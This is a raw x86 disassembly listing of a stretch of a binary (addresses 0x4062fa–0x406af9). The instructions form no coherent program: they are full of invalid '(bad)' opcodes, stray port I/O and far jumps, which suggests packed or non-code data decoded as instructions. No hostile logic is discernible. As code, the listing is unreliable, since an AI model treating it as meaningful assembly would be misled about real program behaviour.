  4062fa:	mov    ah,0x85
  4062fc:	int    0xf5
  4062fe:	mov    ds:0xfa804651,eax
  406303:	xor    esi,0xa9c19240
  406309:	test   BYTE PTR [ebx],bh
  40630b:	or     edi,DWORD PTR [esi+0x7c]
  40630e:	inc    ebx
  40630f:	test   eax,0x7b019315
  406314:	mov    esp,0xec32c072
  406319:	es test dl,ah
  40631c:	cli    
  40631d:	dec    esi
  40631e:	dec    esi
  40631f:	sub    DWORD PTR [ecx+eax*8+0x2d],ebp
  406323:	jb     0x406334
  406325:	or     BYTE PTR [edx],0x58
  406328:	icebp  
  406329:	addr16 jb 0x4062d9
  40632c:	mov    BYTE PTR [eax+0x23],dl
  40632f:	xchg   edx,eax
  406330:	or     eax,0x32c24c5a
  406335:	push   ecx
  406336:	das    
  406337:	jne    0x406326
  406339:	jbe    0x40639a
  40633b:	std    
  40633c:	(bad)  
  40633e:	jne    0x406369
  406340:	add    ecx,edx
  406342:	div    BYTE PTR [edx+0x79a4d8e0]
  406348:	push   edx
  406349:	cmp    DWORD PTR [edi-0x10],eax
  40634c:	jae    0x406310
  40634e:	lock adc al,0x2
  406351:	popa   
  406352:	dec    eax
  406353:	xlat   BYTE PTR ds:[ebx]
  406354:	in     eax,dx
  406355:	icebp  
  406356:	pop    ecx
  406357:	xchg   ebx,esi
  406359:	xchg   ebp,eax
  40635a:	ss push 0xffffffdb
  40635d:	sbb    BYTE PTR [edx+edx*1-0x1cec28d1],bh
  406364:	mov    al,ds:0xcbba628d
  406369:	pop    edx
  40636a:	cmp    al,0xe9
  40636c:	mov    ?,ecx
  40636e:	repz and eax,0xc62926f9
  406374:	pop    ecx
  406375:	sub    DWORD PTR [ebx],0xffffffc5
  406378:	xchg   edi,eax
  406379:	ds int 0x6c
  40637c:	push   ebp
  40637d:	inc    edi
  40637e:	arpl   WORD PTR [ecx-0x40],ax
  406381:	jbe    0x406305
  406383:	sub    ch,0x1e
  406386:	pop    esi
  406387:	call   0x241f:0x3beecfa5
  40638e:	mov    cl,0xb5
  406390:	sbb    BYTE PTR [esi],0x11
  406393:	addr16 mov dh,0x12
  406396:	popf   
  406397:	pop    esi
  406398:	jp     0x406345
  40639a:	mov    eax,0x3538d139
  40639f:	mov    al,ds:0xc6b0c4e6
  4063a4:	stos   BYTE PTR es:[edi],al
  4063a5:	int3   
  4063a6:	jp     0x406396
  4063a8:	shl    BYTE PTR [esi+ecx*2+0x13],cl
  4063ac:	add    bh,BYTE PTR [eax+0x35]
  4063af:	ret    
  4063b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063b1:	pop    edx
  4063b2:	fistp  WORD PTR [eax+0x3dcba0c3]
  4063b8:	ja     0x406430
  4063ba:	jbe    0x40636e
  4063bc:	adc    BYTE PTR [esi],0x63
  4063bf:	push   ebp
  4063c0:	(bad)  
  4063c1:	loope  0x406438
  4063c3:	je     0x4063c9
  4063c5:	retf   
  4063c6:	lods   al,BYTE PTR ds:[esi]
  4063c7:	fimul  WORD PTR [esi+0x2e]
  4063ca:	loopne 0x4063b0
  4063cc:	in     al,0x83
  4063ce:	jmp    0x9ae00850
  4063d3:	leave  
  4063d4:	mov    dl,0x96
  4063d6:	stc    
  4063d7:	popf   
  4063d8:	pusha  
  4063d9:	sbb    BYTE PTR [ecx],0x46
  4063dc:	inc    ecx
  4063dd:	and    esp,DWORD PTR [esi]
  4063df:	or     al,0x7c
  4063e1:	cs or  eax,0x3823eff3
  4063e7:	mov    edi,0x3df5af4a
  4063ec:	dec    esp
  4063ed:	sbb    eax,0x8328a143
  4063f2:	(bad)  
  4063f3:	sbb    bh,BYTE PTR [esi+esi*2]
  4063f6:	adc    DWORD PTR [esi],0xf7ec77a7
  4063fc:	pop    ebp
  4063fd:	mov    bh,0x7d
  4063ff:	in     al,0xad
  406401:	lods   eax,DWORD PTR ds:[esi]
  406402:	add    eax,0x76428c44
  406407:	bound  ebx,QWORD PTR [eax-0x3c]
  40640a:	xchg   edx,eax
  40640b:	lock inc edi
  40640d:	clc    
  40640e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40640f:	ficom  WORD PTR [ecx+0x67134dda]
  406415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406416:	xor    DWORD PTR [esi-0x82330ca],esp
  40641c:	test   DWORD PTR [edx],edi
  40641e:	fidivr WORD PTR [ecx+0x6b8cb96f]
  406424:	adc    DWORD PTR [edx+0x7b],0x84180379
  40642b:	xchg   ah,cl
  40642d:	pusha  
  40642e:	(bad)  
  40642f:	jp     0x406441
  406431:	adc    eax,0x398967f
  406436:	cld    
  406437:	retf   0x99a9
  40643a:	popf   
  40643b:	hlt    
  40643c:	adc    eax,0x2b16e2ed
  406441:	fucomp st(2)
  406443:	in     al,dx
  406444:	push   ebx
  406445:	adc    al,0x78
  406447:	jle    0x40640c
  406449:	push   0xffffff80
  40644b:	fidiv  WORD PTR [eax+0x29]
  40644e:	jnp    0x4063d0
  406450:	pop    ecx
  406451:	(bad)  
  406452:	rcl    dl,0xda
  406455:	das    
  406456:	ret    0x9a81
  406459:	sahf   
  40645a:	and    BYTE PTR [esi],al
  40645c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40645d:	repnz or DWORD PTR [eax-0x64277ca5],eax
  406464:	jle    0x40641b
  406466:	push   cs
  406467:	and    BYTE PTR [esi+0x797b4962],cl
  40646d:	call   0x74bf8b9d
  406472:	sbb    eax,0xb61cfda0
  406477:	xchg   edx,eax
  406478:	cmp    al,0x5c
  40647a:	sub    dl,ch
  40647c:	pop    esp
  40647d:	dec    ebx
  40647e:	lods   eax,DWORD PTR ds:[esi]
  40647f:	pushf  
  406480:	std    
  406481:	retf   0x2bff
  406484:	mov    edi,0xdc68663f
  406489:	cmp    BYTE PTR [edi],0xd3
  40648c:	hlt    
  40648d:	and    al,0x83
  40648f:	mov    ecx,0xb473b420
  406494:	mov    BYTE PTR [edx],al
  406496:	loope  0x406465
  406498:	test   BYTE PTR [ebx-0x40c4a67e],0x7b
  40649f:	sbb    ch,BYTE PTR [edx]
  4064a1:	fcom   st(3)
  4064a3:	sbb    BYTE PTR [edx+0x105463a0],ch
  4064a9:	or     al,BYTE PTR [ebp+0x78817975]
  4064af:	mov    dh,0x96
  4064b1:	cmp    eax,0xc6b69e28
  4064b6:	or     BYTE PTR [ebx+0xd1d3254],al
  4064bc:	es ret 
  4064be:	(bad)  [ebx-0x29]
  4064c1:	sti    
  4064c2:	rol    BYTE PTR [edx-0x74],cl
  4064c5:	push   ds
  4064c6:	jne    0x4064eb
  4064c8:	add    edx,DWORD PTR [eax]
  4064ca:	or     esp,ebp
  4064cc:	shl    BYTE PTR [edx],0xb3
  4064cf:	mov    edx,DWORD PTR [ebp-0x74]
  4064d2:	popa   
  4064d3:	repnz pop ebx
  4064d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d6:	aas    
  4064d7:	sbb    al,0x82
  4064d9:	sbb    bl,dh
  4064db:	leave  
  4064dc:	cdq    
  4064dd:	mov    edi,0xae352cd3
  4064e2:	or     ebp,DWORD PTR [edi-0x3e]
  4064e5:	fld    TBYTE PTR [edi+0x45]
  4064e8:	or     eax,0x3e19b8c7
  4064ed:	xchg   ecx,eax
  4064ee:	xor    eax,0xeacb31a9
  4064f3:	mov    edx,0x22dc110b
  4064f8:	push   eax
  4064f9:	out    dx,al
  4064fa:	je     0x4064e2
  4064fc:	dec    esi
  4064fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064fe:	(bad)  
  406500:	out    0x9c,eax
  406502:	aaa    
  406503:	and    eax,DWORD PTR [ebx]
  406505:	rcl    BYTE PTR ds:0x6ad1151d,0xc9
  40650c:	sbb    edi,DWORD PTR [esi-0x55]
  40650f:	push   ds
  406510:	sti    
  406511:	inc    ecx
  406512:	sub    DWORD PTR [eax+0x36],edi
  406515:	cmc    
  406516:	in     al,dx
  406517:	out    dx,al
  406518:	inc    esi
  406519:	xor    al,0x6c
  40651b:	into   
  40651c:	fs aad 0x9
  40651f:	test   bl,cl
  406521:	or     eax,0xe97b163f
  406526:	test   al,0x66
  406528:	sbb    al,0x6e
  40652a:	mov    ecx,0x2d6b8343
  40652f:	scas   al,BYTE PTR es:[edi]
  406530:	iret   
  406531:	sub    BYTE PTR [esi],bl
  406533:	fnstsw WORD PTR [ecx-0x19]
  406536:	cmp    ch,bh
  406538:	cld    
  406539:	xor    ah,BYTE PTR [eax+eax*8+0x62]
  40653d:	push   es
  40653e:	mov    ch,0xa
  406540:	fdivr  QWORD PTR [eax+ebx*8-0x16]
  406544:	not    DWORD PTR [esi]
  406546:	jne    0x40656b
  406548:	mov    dl,0x2b
  40654a:	out    0x39,eax
  40654c:	add    al,0xce
  40654e:	mov    ebp,0x881fb376
  406553:	push   DWORD PTR [esi]
  406555:	mov    BYTE PTR [edi-0x49],dl
  406558:	ror    DWORD PTR [ebp+edx*8+0x1ed10bdb],1
  40655f:	add    ecx,edi
  406561:	fs push edx
  406563:	push   es
  406564:	jmp    0x4064ee
  406566:	mov    ds:0x46ac591c,al
  40656b:	or     al,0x49
  40656d:	xchg   esp,eax
  40656e:	mov    eax,0x66b60c31
  406573:	mov    esi,DWORD PTR [edx+0x3f282113]
  406579:	mov    DWORD PTR [ecx-0xc],ebp
  40657c:	xchg   DWORD PTR [ebx-0x7d],edx
  40657f:	xchg   ecx,eax
  406580:	lods   al,BYTE PTR ds:[esi]
  406581:	add    al,0x37
  406583:	in     eax,dx
  406584:	outs   dx,DWORD PTR ds:[esi]
  406585:	pop    esi
  406586:	inc    edi
  406587:	popf   
  406588:	ja     0x40656d
  40658a:	add    BYTE PTR [edx+ebp*4-0xa],ch
  40658e:	jge    0x406548
  406590:	ret    
  406591:	sbb    ch,bl
  406593:	call   0xda864496
  406598:	loope  0x406555
  40659a:	das    
  40659b:	stc    
  40659c:	sbb    ah,BYTE PTR [ebx]
  40659e:	dec    ecx
  40659f:	addr16 xor eax,0x89ebb8bb
  4065a5:	add    DWORD PTR [edx-0xe],edi
  4065a8:	fwait
  4065a9:	cmp    DWORD PTR ds:0x8c6b38ed,ecx
  4065af:	pop    ecx
  4065b0:	sub    DWORD PTR [edi+esi*4-0x76],0x93f30399
  4065b8:	sub    dl,ch
  4065ba:	das    
  4065bb:	fisubr DWORD PTR [ecx]
  4065bd:	push   edx
  4065be:	test   BYTE PTR [edi+0x34],dh
  4065c1:	push   cs
  4065c2:	add    eax,0xe06e8a9d
  4065c7:	sub    al,0x23
  4065c9:	mov    edx,0x3c3142a3
  4065ce:	out    0xdd,eax
  4065d0:	xor    eax,0x1f55c8aa
  4065d5:	sub    ebx,edx
  4065d7:	xchg   ebx,eax
  4065d8:	sub    DWORD PTR [eax-0x4],0x2c594e1e
  4065df:	sti    
  4065e0:	xchg   BYTE PTR [edi+0x1400accd],bl
  4065e6:	mov    edx,DWORD PTR [esi-0x62]
  4065e9:	pop    edx
  4065ea:	popa   
  4065eb:	xchg   esi,eax
  4065ec:	xor    BYTE PTR [edi-0x46],0xba
  4065f0:	pop    esi
  4065f1:	xor    bh,ch
  4065f3:	xchg   esp,eax
  4065f4:	test   eax,0xfc0dd390
  4065f9:	(bad)  [ebp+0x56ee5384]
  4065ff:	mov    bh,0x0
  406601:	sub    DWORD PTR [eax],eax
  406603:	daa    
  406604:	pop    ebx
  406605:	fsubrp st(6),st
  406607:	add    eax,0x69f84e3d
  40660c:	jno    0x4065c2
  40660e:	enter  0x4860,0xda
  406612:	ds jl  0x4065f9
  406615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406616:	cmp    al,0xca
  406618:	mov    ch,BYTE PTR [edx+0x4927f51b]
  40661e:	ret    0xaafc
  406621:	mov    esi,ebp
  406623:	xor    DWORD PTR [ecx+0x67],0xffffffc5
  406627:	xor    eax,edi
  406629:	sbb    al,0x54
  40662b:	pop    esp
  40662c:	out    0xe4,eax
  40662e:	ds xchg ebp,eax
  406630:	mov    eax,ds:0xf5ef2dfb
  406635:	ret    
  406636:	shl    BYTE PTR [ebp+0x5e2f22bf],0xc7
  40663d:	and    eax,0x4835f8bb
  406642:	and    cl,ch
  406644:	push   cs
  406645:	sbb    dh,al
  406647:	cmp    eax,0x288b2877
  40664c:	pop    edi
  40664d:	call   0xe442:0x276b89e8
  406654:	repz mov ch,0xcc
  406657:	cmp    DWORD PTR [edi],0xb038fdba
  40665d:	inc    ebp
  40665e:	hlt    
  40665f:	xor    BYTE PTR [eax],al
  406661:	jmp    0x8971a56d
  406666:	jg     0x406662
  406668:	pop    esp
  406669:	mov    bh,0x8d
  40666b:	xor    eax,0xf514400d
  406670:	dec    ebp
  406671:	ins    BYTE PTR es:[edi],dx
  406672:	sbb    ah,ah
  406674:	ds (bad) 
  406676:	out    0x65,al
  406678:	mov    al,BYTE PTR [ebp+0x152d1caa]
  40667e:	daa    
  40667f:	cmp    esp,DWORD PTR [edi-0x40]
  406682:	pop    esp
  406683:	pushf  
  406684:	enter  0xbda3,0x5f
  406688:	test   al,0x2c
  40668a:	mov    cl,0xf5
  40668c:	cli    
  40668d:	dec    edx
  40668e:	xchg   ecx,eax
  40668f:	(bad)  
  406690:	fnstcw WORD PTR ds:0x45029118
  406696:	lods   al,BYTE PTR ds:[esi]
  406697:	outs   dx,DWORD PTR ds:[esi]
  406698:	sbb    ah,ah
  40669a:	cmc    
  40669b:	mov    eax,0x2d8ede6b
  4066a0:	adc    eax,0xc00324e7
  4066a5:	push   ds
  4066a6:	cmp    al,0xcf
  4066a8:	mov    ch,0x50
  4066aa:	jae    0x406680
  4066ac:	fwait
  4066ad:	rcl    BYTE PTR [eax-0x28afb866],cl
  4066b3:	cld    
  4066b4:	jmp    DWORD PTR [ecx-0x35]
  4066b7:	cmp    al,0x7a
  4066b9:	(bad)
  4066bc:	or     DWORD PTR [ebp-0x47],ecx
  4066bf:	(bad)  
  4066c0:	in     eax,dx
  4066c1:	mov    ebp,0xcd1558ba
  4066c6:	mov    ds,WORD PTR [edi+0x28b7671e]
  4066cc:	or     BYTE PTR [esi],bh
  4066ce:	xlat   BYTE PTR ds:[ebx]
  4066cf:	or     DWORD PTR [esp+ebx*2+0x56],0xffffffb6
  4066d4:	sbb    bh,BYTE PTR [ebp+0x64]
  4066d7:	fld    TBYTE PTR [esp+edx*1]
  4066da:	push   0x52b3d21d
  4066df:	ja     0x4066db
  4066e1:	icebp  
  4066e2:	cld    
  4066e3:	push   esi
  4066e4:	dec    edi
  4066e5:	aaa    
  4066e6:	xor    edx,DWORD PTR [eax+0x4e71c364]
  4066ec:	fist   WORD PTR [ebp-0x33]
  4066ef:	sti    
  4066f0:	in     al,dx
  4066f1:	sahf   
  4066f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066f3:	stos   BYTE PTR es:[edi],al
  4066f4:	int3   
  4066f5:	add    BYTE PTR [esi+0x3c7b2a2f],bl
  4066fb:	push   es
  4066fc:	(bad)  
  4066fd:	and    ecx,DWORD PTR [esp+eax*1+0x25]
  406701:	retf   
  406702:	xchg   edi,eax
  406703:	jne    0x4066bc
  406705:	es xchg ecx,eax
  406707:	hlt    
  406708:	nop
  406709:	jno    0x406787
  40670b:	and    dl,0x24
  40670e:	mov    al,ds:0x28e23bb6
  406713:	jle    0x4066fd
  406715:	popf   
  406716:	fmul   DWORD PTR [edi-0x21]
  406719:	inc    esp
  40671a:	jae    0x4066bc
  40671c:	add    esp,DWORD PTR [edi+0xc]
  40671f:	jle    0xe5820403
  406725:	test   al,0xd1
  406727:	adc    ah,cl
  406729:	fcomp  DWORD PTR [esi+ebp*1+0xc]
  40672d:	and    al,0xfd
  40672f:	push   edi
  406730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406731:	mov    ds:0xa8687939,al
  406736:	xlat   BYTE PTR ds:[ebx]
  406737:	or     BYTE PTR [edi-0x4f9d8e8b],bl
  40673d:	and    ch,dh
  40673f:	in     al,dx
  406740:	fistp  QWORD PTR [edx+0x3a]
  406743:	sub    ebx,edi
  406745:	cmc    
  406746:	jecxz  0x40677c
  406748:	push   esi
  406749:	test   DWORD PTR ss:[ecx-0x7397a3cf],ebp
  406750:	inc    edx
  406751:	dec    ecx
  406752:	jne    0x4067d2
  406754:	shr    dl,1
  406756:	cmp    eax,0xf87db276
  40675b:	sub    ch,BYTE PTR [ebx+0x53]
  40675e:	xchg   ebp,eax
  40675f:	or     BYTE PTR [esp+ecx*2],bl
  406762:	inc    esi
  406763:	mov    ah,0xef
  406765:	fcomp  QWORD PTR [edx+0x14]
  406768:	xor    bl,BYTE PTR [edx]
  40676a:	frstor [eax+0x3e9c808a]
  406770:	inc    edi
  406771:	ror    DWORD PTR [eax],1
  406773:	xor    eax,0x48f8062e
  406778:	xchg   ebp,eax
  406779:	adc    BYTE PTR [edx-0x5d4522b6],0x8b
  406780:	sbb    BYTE PTR [esi+ebp*2+0x36741fbc],dl
  406787:	push   ebx
  406788:	xchg   ebp,eax
  406789:	sti    
  40678a:	push   esp
  40678b:	fidivr WORD PTR [edi]
  40678d:	jo     0x406809
  40678f:	fwait
  406790:	xor    eax,0xbbe2130
  406795:	or     al,0xe9
  406797:	jge    0x4067ec
  406799:	ret    0x22c0
  40679c:	push   ss
  40679d:	dec    ebx
  40679e:	adc    al,0xd9
  4067a0:	(bad)  
  4067a1:	pop    ebp
  4067a2:	jmp    0xca0e:0x407e8ff2
  4067a9:	fdivr  DWORD PTR [ecx-0x8967cbd]
  4067af:	push   esp
  4067b0:	mov    bh,0x49
  4067b2:	pop    es
  4067b3:	(bad)  
  4067b5:	inc    ebp
  4067b6:	in     eax,0xd2
  4067b8:	xchg   edx,eax
  4067b9:	adc    al,0x75
  4067bb:	sbb    DWORD PTR [ebx+0x6796684],ebx
  4067c1:	push   edx
  4067c2:	dec    eax
  4067c3:	jnp    0x406781
  4067c5:	or     eax,0x5d0e2559
  4067ca:	gs rcr ecx,0x38
  4067ce:	sbb    esi,ebp
  4067d0:	dec    esi
  4067d1:	jne    0x4067a6
  4067d3:	inc    ebx
  4067d4:	xchg   esi,eax
  4067d5:	sahf   
  4067d6:	lea    ecx,[ebx]
  4067d8:	push   edx
  4067d9:	sbb    dl,BYTE PTR [ecx]
  4067db:	jp     0x406805
  4067dd:	or     ecx,edi
  4067df:	into   
  4067e0:	dec    esp
  4067e1:	fisttp QWORD PTR [edi-0x3d67312b]
  4067e7:	(bad)  [ebx+0x4b]
  4067ea:	rcl    ch,0xfa
  4067ed:	or     ebp,DWORD PTR [edx]
  4067ef:	addr16 xor eax,0x254587e6
  4067f5:	add    edx,DWORD PTR [ebp+0x3c]
  4067f8:	mov    ebx,0xa5981a15
  4067fd:	xchg   ebp,eax
  4067fe:	mov    ecx,0x70cfe586
  406803:	retf   0x56df
  406806:	dec    ebx
  406807:	and    eax,0xabccc409
  40680c:	out    dx,eax
  40680d:	jne    0x406849
  40680f:	retf   0xc9fe
  406812:	cmp    edx,DWORD PTR [edi]
  406814:	sub    eax,edx
  406816:	jbe    0x4067e8
  406818:	mov    edi,0xc713821c
  40681d:	out    0x60,eax
  40681f:	and    ecx,DWORD PTR [edx-0x465f3cbc]
  406825:	inc    esp
  406826:	ret    0x9a10
  406829:	aad    0x99
  40682b:	or     bl,dl
  40682d:	repz add eax,0x886d45c9
  406833:	xchg   ecx,eax
  406834:	ficomp DWORD PTR [ebx+0x3c86aca5]
  40683a:	out    dx,eax
  40683b:	js     0x40684b
  40683d:	sub    eax,0x2c058f3e
  406842:	repz pop es
  406844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406845:	stc    
  406846:	fimul  DWORD PTR [edi]
  406848:	pop    es
  406849:	das    
  40684a:	stc    
  40684b:	mov    bh,BYTE PTR [ebx-0x73]
  40684e:	xor    bh,BYTE PTR [ebx+eiz*1]
  406851:	fisubr WORD PTR [ecx]
  406853:	pushf  
  406854:	fld    st(6)
  406856:	int    0x5c
  406858:	dec    esp
  406859:	or     al,0x3b
  40685b:	pop    ecx
  40685c:	mov    ecx,0x2ba625e7
  406861:	(bad)  
  406862:	(bad)  
  406863:	xchg   edx,eax
  406864:	sub    eax,0x5ca77e14
  406869:	cmp    BYTE PTR [esp+ebx*2-0x61],cl
  40686d:	mov    WORD PTR [eax],?
  40686f:	sbb    eax,0x50bd9359
  406874:	inc    esi
  406875:	(bad)  
  406876:	ss call 0xcd9f8194
  40687c:	inc    ebp
  40687d:	adc    BYTE PTR [edx],al
  40687f:	jmp    0x99d26443
  406884:	je     0x40686f
  406886:	inc    eax
  406887:	pop    ebx
  406888:	pushf  
  406889:	mov    dl,0x56
  40688b:	adc    BYTE PTR [edx+0x4d270159],dl
  406891:	cwde   
  406892:	int    0x97
  406894:	scas   al,BYTE PTR es:[edi]
  406895:	pop    eax
  406896:	loop   0x4068e7
  406898:	bound  edi,QWORD PTR [ebx+0x49360e7f]
  40689e:	mov    eax,ds:0xdf19f1ec
  4068a3:	enter  0x367b,0x32
  4068a7:	fist   DWORD PTR [edi-0x57758f56]
  4068ad:	xor    BYTE PTR [ebp-0x5c],bh
  4068b0:	jg     0x4068aa
  4068b2:	or     DWORD PTR [edx+0x14],ebp
  4068b5:	mov    dh,BYTE PTR [ebp-0x2f]
  4068b8:	daa    
  4068b9:	xor    DWORD PTR [edi+0x78],eax
  4068bc:	call   0x8882:0x75b166e2
  4068c3:	xor    ah,BYTE PTR [ecx]
  4068c5:	ret    
  4068c6:	xor    eax,DWORD PTR [ecx]
  4068c8:	gs jmp 0x40693d
  4068cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068cc:	cmp    ah,BYTE PTR [edi]
  4068ce:	sti    
  4068cf:	pop    ss
  4068d0:	adc    al,0x67
  4068d2:	adc    eax,0xba7e4ceb
  4068d7:	enter  0xacfb,0xce
  4068db:	test   eax,0xd5c3cbe4
  4068e0:	mov    bh,0x55
  4068e2:	ja     0x40689a
  4068e4:	push   es
  4068e5:	js     0x406910
  4068e7:	call   0xf35ee277
  4068ec:	daa    
  4068ed:	inc    ebp
  4068ee:	or     dl,BYTE PTR [eax]
  4068f0:	fstp   QWORD PTR [esi-0x773c322a]
  4068f6:	xchg   edx,eax
  4068f7:	cmp    cl,BYTE PTR [edx]
  4068f9:	cwde   
  4068fa:	sub    edi,ebx
  4068fc:	xchg   ebp,eax
  4068fd:	add    al,0x31
  4068ff:	fdivr  QWORD PTR es:[esi]
  406902:	sbb    eax,0x4a0437b7
  406907:	cmp    al,dh
  406909:	lea    ebx,[eax-0x3]
  40690c:	jp     0x406945
  40690e:	mov    cl,0x47
  406910:	call   0x4b716220
  406915:	dec    ebp
  406916:	dec    edx
  406917:	sar    DWORD PTR [esi],0x15
  40691a:	das    
  40691b:	test   eax,0x329589f5
  406920:	mov    dl,0xeb
  406922:	loopne 0x40695d
  406924:	(bad)  
  406926:	icebp  
  406927:	fyl2x  
  406929:	test   BYTE PTR [ebx-0x1d],bl
  40692c:	xor    BYTE PTR [edi+0x77],0x63
  406930:	sbb    ecx,ebx
  406932:	or     ecx,DWORD PTR [esi-0x11c1d268]
  406938:	jae    0x406982
  40693a:	or     DWORD PTR [edi+eax*2],eax
  40693d:	mov    esi,0x38e91972
  406942:	add    cl,dh
  406944:	jo     0x406903
  406946:	mov    WORD PTR [esi-0x5bb75ee7],gs
  40694c:	xchg   bl,bh
  40694e:	call   0x36b6:0x49d21863
  406955:	into   
  406956:	add    al,0xf6
  406958:	(bad)  
  406959:	ja     0x4069be
  40695b:	fcmovbe st,st(0)
  40695d:	lods   eax,DWORD PTR ds:[esi]
  40695e:	das    
  40695f:	addr16 dec ebp
  406961:	call   0x6968:0xc6fd5471
  406968:	and    ebx,DWORD PTR [edx+0x4f]
  40696b:	and    DWORD PTR [edx+0x26],0x55
  40696f:	xchg   edx,eax
  406970:	mov    eax,ds:0x3c1950ef
  406975:	mov    dl,0xbe
  406977:	jnp    0x406974
  406979:	aas    
  40697a:	test   DWORD PTR [ecx-0x28cd86ae],esi
  406980:	(bad)  
  406981:	sbb    eax,0x6d1ed97e
  406986:	sub    BYTE PTR [eax+edx*2],al
  406989:	pusha  
  40698a:	jno    0x406982
  40698c:	pop    ebp
  40698d:	in     eax,0x6a
  40698f:	ins    BYTE PTR es:[edi],dx
  406990:	out    0xa7,eax
  406992:	pusha  
  406993:	sahf   
  406994:	enter  0x19d5,0xf7
  406998:	mov    eax,0xfe3b70d4
  40699d:	loop   0x406955
  40699f:	sub    edx,DWORD PTR ss:[ecx]
  4069a2:	or     al,0x88
  4069a4:	addr16 inc ebp
  4069a6:	stos   DWORD PTR es:[edi],eax
  4069a7:	cmp    eax,0x17b17cce
  4069ac:	mov    esp,0xfd9e346
  4069b1:	pushf  
  4069b2:	sub    eax,0x770528f
  4069b7:	mov    ds:0x26ff63f,eax
  4069bc:	xchg   BYTE PTR [ebp-0x3f],ch
  4069bf:	outs   dx,DWORD PTR ds:[esi]
  4069c0:	pop    ebx
  4069c1:	in     eax,0xc0
  4069c3:	test   esp,edx
  4069c5:	push   0xfffffff0
  4069c7:	mov    eax,ds:0x28ee6a68
  4069cc:	push   0x1d
  4069ce:	cmc    
  4069cf:	jne    0x406a4d
  4069d1:	aad    0xa8
  4069d3:	sbb    al,0xe7
  4069d5:	xlat   BYTE PTR ds:[ebx]
  4069d6:	xchg   ecx,eax
  4069d7:	mov    cl,0xf9
  4069d9:	pop    sp
  4069db:	inc    ecx
  4069dc:	sti    
  4069dd:	sar    BYTE PTR [eax],0x2a
  4069e0:	mov    ch,0x55
  4069e2:	add    al,0x37
  4069e4:	mov    ah,ch
  4069e6:	je     0x406a59
  4069e8:	ds (bad) 
  4069eb:	(bad)  
  4069ec:	jle    0x4069de
  4069ee:	ss outs dx,DWORD PTR es:[esi]
  4069f1:	mov    al,ah
  4069f3:	sti    
  4069f4:	mov    bh,0x2f
  4069f6:	fcomp  QWORD PTR [ebx+0x6a]
  4069f9:	xchg   ebp,eax
  4069fa:	sub    eax,0x99d72eb4
  4069ff:	ja     0x406a00
  406a01:	pop    ds
  406a02:	mov    esi,0x323f2de6
  406a07:	sub    al,0xdc
  406a09:	test   DWORD PTR [eax-0x7817350],ebp
  406a0f:	aas    
  406a10:	dec    eax
  406a11:	gs (bad) 
  406a13:	fsub   DWORD PTR ds:0x5e433ff
  406a19:	adc    ebx,DWORD PTR [esi+edi*2+0x1da85db2]
  406a20:	scas   al,BYTE PTR es:[edi]
  406a21:	test   eax,0xee84677e
  406a26:	add    eax,0xda855b7f
  406a2b:	inc    esi
  406a2c:	mov    dh,0x90
  406a2e:	es xor ch,ch
  406a31:	jno    0x406a9f
  406a33:	rol    WORD PTR [edx-0x33],0xc8
  406a38:	sbb    edi,DWORD PTR [esi+0x62]
  406a3b:	xchg   edx,eax
  406a3c:	mov    esp,0x1a7f1a0a
  406a41:	cmc    
  406a42:	jl     0x406a1e
  406a44:	popf   
  406a45:	shr    DWORD PTR [esi],0x81
  406a48:	outs   dx,DWORD PTR ds:[esi]
  406a49:	jbe    0x4069ea
  406a4b:	cmp    cl,BYTE PTR [esi]
  406a4d:	pop    edx
  406a4e:	push   edx
  406a4f:	loop   0x406a53
  406a51:	(bad)  
  406a52:	cmp    BYTE PTR [ecx+0x653db0fb],ah
  406a58:	xor    esp,DWORD PTR [ebp+0x6f]
  406a5b:	and    eax,0xa841b84b
  406a60:	sub    DWORD PTR [edx-0x629e2b25],ebp
  406a66:	(bad)  
  406a68:	sahf   
  406a69:	add    al,0xb2
  406a6b:	ret    
  406a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a6e:	push   ecx
  406a6f:	sub    BYTE PTR [esp+ecx*8+0x73a7ea79],ch
  406a76:	jecxz  0x406a84
  406a78:	mov    eax,0x8a9126f8
  406a7d:	das    
  406a7e:	fcmovb st,st(6)
  406a80:	cmp    al,0x13
  406a82:	xor    al,0x77
  406a84:	rcl    DWORD PTR [eax],cl
  406a86:	adc    DWORD PTR [ebx+0x43],esi
  406a89:	mov    ah,0x82
  406a8b:	fnsave [ebx+0x28ff471b]
  406a91:	retf   
  406a92:	into   
  406a93:	pop    edx
  406a94:	dec    esp
  406a95:	mov    edx,0x2e75e46e
  406a9a:	inc    ebx
  406a9b:	mov    eax,0xcacbc70d
  406aa0:	add    eax,0x28f28bf4
  406aa5:	test   eax,0x311411a0
  406aaa:	sti    
  406aab:	ret    0x6357
  406aae:	jmp    0x406ad6
  406ab0:	repz inc edx
  406ab2:	xchg   esi,eax
  406ab3:	loop   0x406b31
  406ab5:	in     eax,0xbc
  406ab7:	pop    eax
  406ab8:	cmp    eax,0x2bca3b02
  406abd:	mov    ebp,0x5141f616
  406ac2:	jnp    0x406afa
  406ac4:	data16 stos BYTE PTR es:[edi],al
  406ac6:	jp     0x406b34
  406ac8:	imul   edi,DWORD PTR ds:0xe0c47eeb,0xffffffb9
  406acf:	(bad)  
  406ad0:	cmp    al,0x7
  406ad2:	jae    0x406a5a
  406ad4:	xor    DWORD PTR [edx+0xe],esp
  406ad7:	xlat   BYTE PTR ds:[ebx]
  406ad8:	inc    BYTE PTR [ecx]
  406ada:	mov    ah,0x59
  406adc:	xchg   ebp,eax
  406add:	ror    DWORD PTR [eax+0x76589f0c],0xdd
  406ae4:	pop    esp
  406ae5:	cmp    edx,DWORD PTR [esi]
  406ae7:	push   edx
  406ae8:	push   esp
  406ae9:	xchg   bl,al
  406aeb:	daa    
  406aec:	push   0x26
  406aee:	pop    eax
  406aef:	shr    BYTE PTR [ebx+0x77c6650e],1
  406af5:	xchg   edi,eax
  406af6:	in     al,0x6a
  406af8:	inc    esp
  406af9:	arpl   WORD PTR [eax+0xc],si
